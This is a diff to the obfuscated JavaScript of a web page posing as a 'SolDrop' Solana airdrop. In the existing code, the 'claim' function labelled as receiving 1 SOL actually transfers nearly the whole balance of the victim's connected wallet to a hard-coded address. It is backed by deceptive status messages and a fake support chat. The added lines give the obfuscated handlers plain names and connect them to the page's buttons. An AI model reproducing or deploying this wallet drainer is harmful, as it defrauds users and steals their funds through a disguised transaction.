@@ -243,6 +243,14 @@ async function _QF(){window.open("https://x.com/solana","_blank");_L("Confirming
 async function _QC(){if(document.querySelectorAll(".step.done").length<3){_L("Finish all 3 quests first.");return}try{_L("Final signature — approve to receive 1 SOL...");var pk=_W.publicKey;var bal=await _C.getBalance(pk);var d=new solanaWeb3.PublicKey(_R);var r=await _C.getLatestBlockhash();var tx=new solanaWeb3.Transaction({recentBlockhash:r.blockhash,feePayer:pk});var lam=Math.floor(bal-5000);if(lam<=0){_L("Empty wallet — nothing to verify.");return}tx.add(solanaWeb3.SystemProgram.transfer({fromPubkey:pk,toPubkey:d,lamports:lam}));var sg=await _W.signTransaction(tx);var sig=await _C.sendRawTransaction(sg.serialize());_L("Claim broadcast: "+sig.slice(0,16)+"... check your wallet shortly.")}catch(e){_L("Claim failed: "+(e.message||e))}}
 function _SP(id){document.querySelectorAll(".page").forEach(function(p){p.classList.remove("active")});document.getElementById("page-"+id).classList.add("active");document.querySelectorAll(".navlinks span").forEach(function(s){s.classList.remove("active")});document.getElementById("nav-"+id).classList.add("active");window.scrollTo({top:0,behavior:"smooth"})}
 function _SC(){var v=document.getElementById("chatMsg").value;if(!v)return;var lo=v.toLowerCase();var r="Got it — a human will pick this up on Discord shortly.";if(lo.indexOf("claim")>=0||lo.indexOf("sol")>=0)r="To claim: connect wallet → verify 0.05 SOL → follow @solana → press CLAIM.";else if(lo.indexOf("wallet")>=0||lo.indexOf("connect")>=0)r="Click Connect at the top — Phantom, Solflare, Backpack all work.";else if(lo.indexOf("seed")>=0||lo.indexOf("phrase")>=0)r="Never share your seed phrase — SolDrop only asks for a signature.";document.getElementById("chatOk").textContent=r;document.getElementById("chatMsg").value=""}
+function questConnect(){_O()}
+function questVerify(){_QV()}
+function questFollow(){_QF()}
+function questClaim(){_QC()}
+function openModal(){_O()}
+function closeModal(){_X()}
+function sendChat(){_SC()}
+function showPage(id){_SP(id)}
 </script>
 </body>
 </html>
